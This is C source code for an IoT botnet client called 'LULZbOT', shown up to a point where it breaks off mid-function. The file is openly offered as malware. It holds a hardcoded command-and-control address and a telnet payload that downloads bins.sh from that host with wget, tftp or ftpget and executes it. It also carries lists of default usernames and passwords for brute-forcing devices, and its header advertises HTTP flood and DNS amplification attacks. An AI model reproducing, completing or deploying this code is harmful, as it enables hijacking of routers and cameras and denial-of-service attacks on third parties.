/*
                  This is the official build of LULZbOT
                                     _____________
                                    //PLEASE SHARE\\
                                    \\ THIS REPS  //
                                     \\__________//
            	  Yeah thats right this shit reps you gone be a big
                               Goat Greper like cheats and void, thanks to Freak
                               new telnet scanner, decked out ddos methods and 
                               lots of swegg with dat dns amp boi
                  Just a lil credz to all the peeps that made this possible
                                        B1NARY
                                        ZONEHAX
                                        CHEATS
                                        Freak
                                  Thanks to them this
                                  bot is as dank as it 
                                  is XD this is the main
                                  build if you have this
                                  means you're an OG.
                                          
                                V1 OFFICIAL FINAL BUILD
			                 Contains Multi-Threaded HTTP ATTACK and DNS AMP
*/
#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(cncServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define STD2_SIZE 65
#define SOCKBUF_SIZE 1024
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <time.h>
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))

// ip for all of the files
//Port needs to be changed down below so yeah 
unsigned char *cncServer[] = {
    "199.38.245.222:23"
};

// Telnet scanner payload, must end with \r\n\0
char *rekdevice = "cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\r\n\0";

const char *knownBots[] = {
    "902i13",
    "BzSxLxBxeY",
    "HOHO-LUGO7",
    "HOHO-U79OL",
    "JuYfouyf87",
    "NiGGeR69xd",
    "SO190Ij1X",
    "LOLKIKEEEDDE",
    "ekjheory98e",
    "scansh4",
    "MDMA",
    "fdevalvex",
    "scanspc",
    "MELTEDNINJAREALZ",
    "flexsonskids",
    "scanx86",
    "foAxi102kxe",
    "swodjwodjwoj",
    "MmKiy7f87l",
    "freecookiex86",
    "sysgpu",
    "NiGGeR69xd",
    "frgege",
    "sysbinsr",
    "0DnAzepd",
    "NiGGeRD0nks69",
    "frgreu",
    "telnetd",
    "0x766f6964",
    "NiGGeRd0nks1337",
    "gaft",
    "urasgbsigboa",
    "120i3UI49",
    "OaF3",
    "geae",
    "vaiolmao",
    "123123a",
    "Ofurain0n4H34D",
    "ggTrex",
    "wasads",
    "1293194hjXD",
    "OthLaLosn",
    "ggt",
    "wget-log",
    "1337SoraLOADER",
    "SAIAKINA",
    "ggtq",
    "1378bfp919GRB1Q2",
    "SAIAKUSO",
    "ggtr",
    "14Fa",
    "SEXSLAVE1337",
    "ggtt",
    "1902a3u912u3u4",
    "SO190Ij1X",
    "haetrghbr",
    "19ju3d",
    "SORAojkf120",
    "hehahejeje92",
    "2U2JDJA901F91",
    "SlaVLav12",
    "helpmedaddthhhhh",
    "2wgg9qphbq",
    "Slav3Th3seD3vices",
    "hzSmYZjYMQ",
    "5Gbf",
    "SoRAxD123LOL",
    "iaGv",
    "5aA3",
    "SoRAxD420LOL",
    "insomni",
    "640277",
    "SoraBeReppin1337",
    "ipcamCache",
    "66tlGg9Q",
    "T",
    "jUYfouyf87",
    "6ke3",
    "TOKYO3",
    "lyEeaXul2dULCVxh",
    "93OfjHZ2z",
    "TY2gD6MZvKc7KU6r",
    "mMkiy6f87l",
    "A023UU4U24UIU",
    "TheWeeknd",
    "mioribitches",
    "A5p9",
    "TheWeeknds",
    "mnblkjpoi",
    "AbAd",
    "Tokyos",
    "neb",
    "Akiru",
    "U8inTz",
    "netstats",
    "Alex",
    "W9RCAKM20T",
    "newnetword",
    "Ayo215",
    "Word",
    "nloads",
    "BAdAsV",
    "Wordmane",
    "notyakuzaa",
    "Belch",
    "Wordnets",
    "obp",
    "BigN0gg0r420",
    "X0102I34f",
    "ofhasfhiafhoi",
    "BzSxLxBxeY",
    "X19I239124UIU",
    "oism",
    "Deported",
    "XSHJEHHEIIHWO",
    "olsVNwo12",
    "DeportedDeported",
    "XkTer0GbA1",
    "onry0v03",
    "FortniteDownLOLZ",
    "Y0urM0mGay",
    "pussyfartlmaojk",
    "GrAcEnIgGeRaNn",
    "YvdGkqndCO",
    "qGeoRBe6BE",
    "GuiltyCrown",
    "ZEuS69",
    "s4beBsEQhd",
    "HOHO-KSNDO",
    "ZEuz69",
    "sat1234",
    "HOHO-LUGO7",
    "aj93hJ23",
    "scanHA",
    "HOHO-U79OL",
    "alie293z0k2L",
    "scanJoshoARM",
    "HellInSide",
    "ayyyGangShit",
    "scanJoshoARM5",
    "HighFry",
    "b1gl",
    "scanJoshoARM6",
    "IWhPyucDbJ",
    "boatnetz",
    "scanJoshoARM7",
    "IuYgujeIqn",
    "btbatrtah",
    "scanJoshoM68K",
    "JJDUHEWBBBIB",
    "c",
    "scanJoshoMIPS",
    "JSDGIEVIVAVIG",
    "cKbVkzGOPa",
    "scanJoshoMPSL",
    "JuYfouyf87",
    "ccAD",
    "scanJoshoPPC",
    "KAZEN-OIU97",
    "chickenxings",
    "scanJoshoSH4",
    "yakuskzm8",
    "KAZEN-PO78H",
    "cleaner",
    "scanJoshoSPC",
    "yakuv4vxc",
    "KAZEN-U79OL",
    "dbeef",
    "scanJoshoX86",
    "yakuz4c24",
    "KETASHI32",
    "ddrwelper",
    "scanarm5",
    "zPnr6HpQj2",
    "Kaishi-Iz90Y",
    "deexec",
    "scanarm6",
    "zdrtfxcgy",
    "Katrina32",
    "doCP3fVj",
    "scanarm7",
    "zxcfhuio",
    "Ksif91je39",
    "scanm68k",
    "Kuasa",
    "dvrpelper",
    "scanmips",
    "KuasaBinsMate",
    "eQnOhRk85r",
    "scanmpsl",
    "LOLHHHOHOHBUI",
    "eXK20CL12Z",
    "scanppc"
};

int initConnection();
int getBogos(unsigned char * bogomips);
int getCores();
int getCountry(unsigned char * buf, int bufsize);
void makeRandomStr(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);

int mainCommSock = 0;
int actualparent = 0;
int currentServer = -1;
int gotIP = 0;
int *pids;
int numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
    0
};

char * usernames[] = {
    "\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "root\0",
    "admin\0",
    "root\0",
    "default\0",
    "user\0",
    "guest\0",
    "daemon\0",
    "admin\0",
    "admin\0",
    "root\0",
    "admin\0",
    "adm\0",
    "guest\0",
    "root\0",
    "root\0",
    "telnet\0",
    "root\0",
    "admin\0",
    "admin\0",
    "Administrator\0",
    "root\0",
    "mg3500\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "default\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin1\0",
    "ubnt\0",
    "support\0",
    "root\0",
    "user\0",
    "guest\0"
};

char * passwords[] = {
    "\0",
    "root\0",
    "password\0",
    "\0",
    "Zte521\0",
    "vizxv\0",
    "000000\0",
    "14567\0",
    "hi3518\0",
    "user\0",
    "pass\0",
    "admin14\0",
    "7ujMko0admin\0",
    "00000000\0",
    "<>\0",
    "klv1\0",
    "klv14\0",
    "oelinux1\0",
    "realtek\0",
    "1111\0",
    "54321\0",
    "antslq\0",
    "zte9x15\0",
    "system\0",
    "1456\0",
    "888888\0",
    "ikwb\0",
    "default\0",
    "juantech\0",
    "xc3511\0",
    "support\0",
    "1111111\0",
    "service\0",
    "145\0",
    "4321\0",
    "tech\0",
    "<>\0",
    "abc1\0",
    "7ujMko0admin\0",
    "switch\0",
    "admin14\0",
    "\0",
    "1111\0",
    "meinsm\0",
    "pass\0",
    "smcadmin\0",
    "14567890\0",
    "14\0",
    "admin1\0",
    "password\0",
    "admin\0",
    "anko\0",
    "xc3511\0",
    "1456\0",
    "\0",
    "guest\0",
    "145\0",
    "xc3511\0",
    "admin\0",
    "Zte521\0",
    "\0",
    "user\0",
    "guest\0",
    "\0",
    "password\0",
    "admin1\0",
    "ikwb\0",
    "14567890\0",
    "\0",
    "\0",
    "1456\0",
    "root\0",
    "telnet\0",
    "zte9x15\0",
    "meinsm\0",
    "\0",
    "\0",
    "antslq\0",
    "merlin\0",
    "switch\0",
    "7ujMko0admin\0",
    "abc1\0",
    "<>\0",
    "tech\0",
    "4321\0",
    "default\0",
    "145\0",
    "service\0",
    "1111111\0",
    "admin14\0",
    "pass\0",
    "user\0",
    "hi3518\0",
    "password\0",
    "ubnt\0",
    "zlxx.\0",
    "14567\0",
    "000000\0"
};

int scanPid = 0;

char * advances[] = {
    ":",
    "ser",
    "ogin",
    "name",
    "pass",
    "dvrdvs",
    (char * ) 0
};
char * fails[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "error",
    "goodbye",
    "bad",
    "timeout",
    (char * ) 0
};
char * successes[] = {
    "$",
    "#",
    ">",
    "@",
    "shell",
    "dvrdvs",
    "usybox",
    (char * ) 0
};
char * advances2[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "rror",
    "oodbye",
    "bad",
    "busybox",
    "$",
    "#",
    (char * ) 0
};
char * legit[] = {
    "AK47",
    (char * ) 0
};
char * infected[] = {
    "LULZbOT",
    (char * ) 0
};

char * UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
    "wii libnup/1.0",
    "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
    "PSP (PlayStation Portable); 2.00",
    "Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
    "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
    "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
};

static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1)&4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if(x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}


void trim(char * str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (!strcmp(str[end], " ")) begin++;

    while ((end >= begin) && !strcmp(str[end], " ")) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}

static void printchar(unsigned char ** str, int c) {
    if (str) { **
        str = c;
        ++( * str);
    } else(void) write(1, & c, 1);
}

static int prints(unsigned char ** out,
    const unsigned char * string, int width, int pad) {
    register int pc = 0, padchar = ' ';

    if (width > 0) {
        register int len = 0;
        register
        const unsigned char * ptr;
        for (ptr = string;* ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & PAD_ZERO) padchar = '0';
    }
    if (!(pad & PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (;* string; ++string) {
        printchar(out, * string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }

    return pc;
}

static int printi(unsigned char ** out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char * s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN - 1;
    * s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if (width && (pad & PAD_ZERO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}

static int print(unsigned char ** out,
    const unsigned char * format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (;* format != 0; ++format) {
        if ( * format == '%') {
            ++format;
            width = pad = 0;
            if ( * format == '\0') break;
            if ( * format == '%') goto out;
            if ( * format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while ( * format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for (;* format >= '0' && * format <= '9'; ++format) {
                width *= 10;
                width += * format - '0';
            }
            if ( * format == 's') {
                register char * s = (char * ) va_arg(args, int);
                pc += prints(out, s ? s : "(null)", width, pad);
                continue;
            }
            if ( * format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if ( * format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if ( * format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out: printchar(out, * format);
            ++pc;
        }
    }
    if (out) ** out = '\0';
    va_end(args);
    return pc;
}

int zprintf(const unsigned char * format, ...) {
    va_list args;
    va_start(args, format);
    return print(0, format, args);
}

int szprintf(unsigned char * out,
    const unsigned char * format, ...) {
    va_list args;
    va_start(args, format);
    return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
    unsigned char * textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char * orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print( & textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}

static int * fdopen_pids;

int fdpopen(unsigned char * program, register unsigned char * type) {
    register int iop;
    int pdes[2], fds, pid;

    if ( * type != 'r' && * type != 'w' || type[1]) return -1;

    if (pipe(pdes) < 0) return -1;
    if (fdopen_pids == NULL) {
        if ((fds = getdtablesize()) <= 0) return -1;
        if ((fdopen_pids = (int * ) malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
        memset((unsigned char * ) fdopen_pids, 0, fds * sizeof(int));
    }

    switch (pid = vfork()) {
    case -1:
        close(pdes[0]);
        close(pdes[1]);
        return -1;
    case 0:
        if ( * type == 'r') {
            if (pdes[1] != 1) {
                dup2(pdes[1], 1);
                close(pdes[1]);
            }
            close(pdes[0]);
        } else {
            if (pdes[0] != 0) {
                (void) dup2(pdes[0], 0);
                (void) close(pdes[0]);
            }
            (void) close(pdes[1]);
        }
        execl("/bin/sh", "sh", "-c", program, NULL);
        _exit(127);
    }
    if ( * type == 'r') {
        iop = pdes[0];
        (void) close(pdes[1]);
    } else {
        iop = pdes[1];
        (void) close(pdes[0]);
    }
    fdopen_pids[iop] = pid;
    return (iop);
}

int fdpclose(int iop) {
    register int fdes;
    sigset_t omask, nmask;
    int pstat;
    register int pid;

    if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
    (void) close(iop);
    sigemptyset( & nmask);
    sigaddset( & nmask, SIGINT);
    sigaddset( & nmask, SIGQUIT);
    sigaddset( & nmask, SIGHUP);
    (void) sigprocmask(SIG_BLOCK, & nmask, & omask);
    do {
        pid = waitpid(fdopen_pids[iop], (int * ) & pstat, 0);
    } while (pid == -1 && errno == EINTR);
    (void) sigprocmask(SIG_SETMASK, & omask, NULL);
    fdopen_pids[fdes] = 0;
    return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char * fdgets(unsigned char * buffer, int bufferSize, int fd) {
    int got = 1, total = 0;
    while (got == 1 && total < bufferSize && * (buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got == 0 ? NULL : buffer;
}

static
const long hextable[] = {
    [0 ... 255] = -1,
    ['0'] = 0,
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    ['A'] = 10,
    11,
    12,
    13,
    14,
    15,
    ['a'] = 10,
    11,
    12,
    13,
    14,
    15
};

long parseHex(unsigned char * hex) {
    long ret = 0;
    while ( * hex && ret >= 0) ret = (ret << 4) | hextable[ * hex++];
    return ret;
}

int wildString(const unsigned char * pattern,
    const unsigned char * string) {
    switch ( * pattern) {
    case '\0':
        return *string;
    case '*':
        return !(!wildString(pattern + 1, string) || * string && !wildString(pattern, string + 1));
    case '?':
        return !( * string && !wildString(pattern + 1, string + 1));
    default:
        return !((toupper( * pattern) == toupper( * string)) && !wildString(pattern + 1, string + 1));
    }
}

int getHost(unsigned char * toGet, struct in_addr * i) {
    struct hostent * h;
    if ((i -> s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

void uppercase(unsigned char * str) {
    while ( * str) {* str = toupper( * str);
        str++;
    }
}

int getBogos(unsigned char * bogomips) {
    int cmdline = open("/proc/cpuinfo", O_RDONLY);
    char linebuf[4096];
    while (fdgets(linebuf, 4096, cmdline) != NULL) {
        uppercase(linebuf);
        if (strstr(linebuf, "BOGOMIPS") == linebuf) {
            unsigned char * pos = linebuf + 8;
            while ( * pos == ' ' || * pos == '\t' || * pos == ':') pos++;
            while (pos[strlen(pos) - 1] == '\r' || pos[strlen(pos) - 1] == '\n') pos[strlen(pos) - 1] = 0;
            if (strchr(pos, '.') != NULL) * strchr(pos, '.') = 0x00;
            strcpy(bogomips, pos);
            close(cmdline);
            return 0;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);
    return 1;
}

int getCores() {
    int totalcores = 0;
    int cmdline = open("/proc/cpuinfo", O_RDONLY);
    char linebuf[4096];
    while (fdgets(linebuf, 4096, cmdline) != NULL) {
        uppercase(linebuf);
        if (strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
        memset(linebuf, 0, 4096);
    }
    close(cmdline);
    return totalcores;

}

void makeRandomStr(unsigned char * buf, int length) {
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}

int recvLine(int socket, unsigned char * buf, int bufsize) {
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO( & myset);
    FD_SET(socket, & myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
        while (retryCount < 10) {
            sockprintf(mainCommSock, "PING");

            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO( & myset);
            FD_SET(socket, & myset);
            if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
                retryCount++;
                continue;
            }

            break;
        }
    }

    unsigned char tmpchr;
    unsigned char * cp;
    int count = 0;

    cp = buf;
    while (bufsize--> 1) {
        if (recv(mainCommSock, & tmpchr, 1, 0) != 1) {
            * cp = 0x00;
            return -1;
        }
        * cp++ = tmpchr;
        if (tmpchr == '\n') break;
        count++;
    }
    * cp = 0x00;

    // zprintf("recv: %s\n", cp);

    return count;
}

struct telstate_t {
    int fd;
    unsigned int ip;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned char tempDirInd;
    unsigned int totalTimeout;
    unsigned short bufUsed;
    char * sockbuf;
};
const char * get_telstate_host(struct telstate_t * telstate) {
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = telstate -> ip;
    return inet_ntoa(in_addr_ip);
}

void advance_telstate(struct telstate_t * telstate, int new_state) { // advance
    if (new_state == 0) {
        close(telstate->fd);
    }
    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}

int negotiate(int sock, unsigned char *buf, int len) {
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock,&c, 1, MSG_NOSIGNAL);
        send(sock,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }

    return 0;
}

int contains_string(char *buffer, char ** strings) {
    int num_strings = 0, i = 0;
    for (num_strings = 0; strings[++num_strings] != 0;);
    for (i = 0; i < num_strings; i++) {
        if (strcasestr(buffer, strings[i])) {
            return 1;
        }
    }
    return 0;
}

int read_with_timeout(int fd, int timeout_usec, char *buffer, int buf_size) {
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = timeout_usec;
    FD_ZERO(&read_set);
    FD_SET(fd,&read_set);
    if (select(fd + 1,&read_set, NULL, NULL,&tv) < 1)
        return 0;
    return recv(fd, buffer, buf_size, 0);
}

int read_until_response(int fd, int timeout_usec, char * buffer, int buf_size, char ** strings) {
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

    if (buffer[0] == 0xFF) {
        negotiate(fd, buffer, 3);
    }

    if (contains_string(buffer, strings)) {
        return 1;
    }

    return 0;
}

void advance_state(struct telstate_t * telstate, int new_state) {
    if (new_state == 0) {
        close(telstate -> fd);
    }

    telstate -> totalTimeout = 0;
    telstate -> state = new_state;
    memset((telstate -> sockbuf), 0, SOCKBUF_SIZE);
}

void reset_telstate(struct telstate_t * telstate) {
    advance_state(telstate, 0);
    telstate -> complete = 1;
}
int contains_success(char * buffer) {
    return contains_string(buffer, successes);
}
int contains_fail(char * buffer) {
    return contains_string(buffer, fails);
}
int contains_response(char * buffer) {
    return contains_success(buffer) || contains_fail(buffer);
}

int connectTimeout(int fd, char * host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(host, & dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO( & myset);
            FD_SET(fd, & myset);
            if (select(fd + 1, NULL, & myset, NULL, & tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                if (valopt) return 0;
            } else return 0;
        } else return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int listFork() {
    int parent, * newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (int * ) malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

int matchPrompt(char * bufStr) {
    char * prompts = ":>%$#\0";

    int bufLen = strlen(bufStr);
    int i, q = 0;
    for (i = 0; i < strlen(prompts); i++) {
        while (bufLen > q && ( * (bufStr + bufLen - q) == 0x00 || * (bufStr + bufLen - q) == ' ' || * (bufStr + bufLen - q) == '\r' || * (bufStr + bufLen - q) == '\n')) q++;
        if ( * (bufStr + bufLen - q) == prompts[i]) return 1;
    }

    return 0;
}

int readUntil(int fd, char * toFind, int matchLePrompt, int timeout, int timeoutusec, char * buffer, int bufSize, int initialIndex) {
    int bufferUsed = initialIndex, got = 0, found = 0;
    fd_set myset;
    struct timeval tv;
    tv.tv_sec = timeout;
    tv.tv_usec = timeoutusec;
    unsigned char * initialRead = NULL;

    while (bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0)) {
        FD_ZERO( & myset);
        FD_SET(fd, & myset);
        if (select(fd + 1, & myset, NULL, NULL, & tv) < 1) break;
        initialRead = buffer + bufferUsed;
        got = recv(fd, initialRead, 1, 0);
        if (got == -1 || got == 0) return 0;
        bufferUsed += got;
        if ( * initialRead == 0xFF) {
